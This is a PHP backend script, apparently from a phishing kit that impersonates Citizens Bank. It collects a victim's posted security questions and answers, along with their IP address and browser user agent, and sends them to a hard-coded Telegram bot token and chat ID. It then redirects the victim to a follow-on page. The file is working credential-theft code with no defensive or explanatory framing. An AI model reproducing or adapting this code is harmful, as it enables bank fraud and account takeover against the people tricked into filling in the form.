<?php

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


header ("Location: xssn.html");
  
    $usera = $_SERVER['HTTP_USER_AGENT'];
                $xip = get_client_ip();

define ('url',"https://api.telegram.org/bot1971024149:AAEdYKThLHTn9NB6QODcrzEjrvMU9cePf2k/");
$xq1 = $_POST['q1'];
$xq1ans = $_POST['xq1ans'];
$xq2 = $_POST['q2'];
$xq2ans = $_POST['xq2ans'];
$xq3 = $_POST['q3'];
$xq3ans = $_POST['xq3ans'];
$chat_id = '821572555';
$message = urlencode("==============Citizen Bank Questions============\nQ1 : ".$xq1."\nQ1ans : ".$xq1ans."\nQ2 : ".$xq2."\nQ2ans : ".$xq2ans."\nQ3 : ".$xq3."\nQ3ans : ".$xq3ans."\nIP Address : ".$xip."\nUseragent : ".$usera."\n===============================");
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");

?>